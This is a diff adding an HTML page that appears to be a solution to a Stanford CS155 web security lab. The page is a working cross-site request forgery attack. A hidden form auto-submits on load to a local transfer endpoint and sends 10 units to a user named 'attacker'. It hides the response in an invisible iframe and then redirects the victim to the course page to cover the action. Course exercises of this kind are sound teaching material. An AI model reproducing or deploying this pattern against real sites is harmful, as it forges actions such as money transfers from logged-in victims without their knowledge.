@@ -1,0 +1,22 @@
+<html>
+
+<head></head>
+<body>  
+  <form action="http://localhost:3000/post_transfer?disable_fb=yes" method=POST target=res>
+    <input type="hidden" name="destination_username" value="attacker">
+    <input type="hidden" name="quantity" value=10>
+  </form>
+  <script type="text/javascript">
+    submitted = false;
+  </script>
+
+  <iframe name="res" onload="if (submitted) window.location.replace('http://crypto.stanford.edu/cs155/');" style="display: none;">
+  </iframe>
+  
+  <script>
+    document.forms[0].submit();
+    submitted = true;
+  </script>
+
+</body>
+</html>
